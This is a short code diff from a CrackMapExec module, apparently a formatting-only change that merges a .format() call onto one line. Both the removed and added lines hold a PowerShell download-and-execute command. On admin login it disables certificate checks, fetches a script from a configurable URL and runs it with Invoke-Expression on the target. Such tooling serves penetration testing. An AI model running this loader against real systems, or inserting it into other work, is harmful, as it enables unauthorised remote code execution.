@@ -38,9 +38,7 @@ class CMEModule:
             self.payload = module_options["PAYLOAD"]
 
     def on_admin_login(self, context, connection):
-        ps_command = """[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{}');""".format(
-            self.url
-        )
+        ps_command = """[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{}');""".format(self.url)
         if self.payload == "32":
             connection.ps_execute(ps_command, force_ps32=True)
         else:
